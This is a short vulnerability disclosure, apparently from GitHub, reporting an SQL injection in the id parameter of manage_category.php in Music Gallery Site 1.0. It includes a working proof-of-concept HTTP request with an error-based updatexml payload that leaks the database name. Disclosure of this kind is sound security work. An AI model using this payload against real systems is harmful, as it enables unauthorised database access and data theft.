## Music Gallery Site has a front-end SQL injection vulnerability

## Affected version: 
Music Gallery Site - 1.0

## Author:
Liuhaobin

## Software:
https://www.sourcecodester.com/php/16073/music-gallery-site-using-php-and-mysql-database-free-source-code.html

## Vulnerability File:
/php-music/admin/categories/manage_category.php

## Description:
Music Gallery Site 1.0 is vulnerable to an unrestricted SQL injection attack in s/manage_category.php. An attacker can exploit this vulnerability to directly obtain sensitive server information. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
GET /php-music/admin/categories/manage_category.php?id=1%27+and+updatexml(1%2Cconcat(0x7e%2C(database()))%2C3)--+q HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```
<img width="1216" alt="image" src="https://github.com/user-attachments/assets/26661d41-f226-45ab-a713-2bced704a11b">


